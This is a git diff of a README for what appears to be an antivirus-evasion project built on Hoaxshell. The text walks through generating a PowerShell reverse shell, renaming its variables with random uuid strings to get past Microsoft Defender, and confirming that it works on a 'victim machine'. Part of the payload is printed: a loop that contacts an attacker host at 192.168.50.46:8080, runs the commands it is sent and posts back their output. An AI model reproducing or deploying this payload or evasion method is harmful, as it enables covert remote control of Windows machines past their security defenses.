@@ -11,7 +11,7 @@ defender, thank you brother
 
 ![2-1](https://github.com/sudo-awk/av_evasion-hoaxshell/assets/106952099/2b438ba0-2e94-4c58-9e86-4a95ab128d5f)
 
-#1. Create a shell using Hoaxshell
+# 1. Create a shell using Hoaxshell
 
 I used this command,
 ```
@@ -22,7 +22,7 @@ I used this command,
 -H = additional hoaxshell tag to bypass defender
 `
 
-and then it will spit out this shell here
+# 2. and then it will spit out this shell here
 
 ```
 $s='192.168.50.46:8080';$i='db6a3b05-dc656d46-1fb446ac';$p='
@@ -35,13 +35,14 @@ $t=Invoke-WebRequest -Uri $p$s/1fb446ac -Method POST -Headers
 @{"Authorization"=$i} -Body
 ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
 ```
+
 ![2-2](https://github.com/sudo-awk/av_evasion-hoaxshell/assets/106952099/3bde52e7-7870-4b65-9a04-b0f687e34683)
 
- ```
 
 this raw payload would be flagged down by microsoft so I used variable
-substitution I learned from t3l3machus,
-Using python I used uuid module as well to create random strings
+substitution I learned from t3l3machu
+
+# 3.Using python I used uuid module as well to create random strings
 
 python commands I used to spit out 10 random strings
 
@@ -56,15 +57,16 @@ uuid.uuid4().hex
 
 ## ```
 
-and then I opened sublime text to edit some variables , I changed 7
-variables from the raw payload before, to look like this,
-```
+# 4. and then I opened sublime text to edit some variables ,
+I changed 7 variables from the raw payload before, to look like this,
+
+
 ![2-4](https://github.com/sudo-awk/av_evasion-hoaxshell/assets/106952099/9789c167-9a55-4b5e-af13-92dc7a6dfd8b)
 
-## ```
 
-and then I tested it in my victim machine with Microsoft Defender
+# 5. and then I tested it in my victim machine with Microsoft Defender
 active , and it WORKS!!!
+
 ```
 ![2-5](https://github.com/sudo-awk/av_evasion-hoaxshell/assets/106952099/4b857298-8967-4d0d-be16-d95955772431)
 
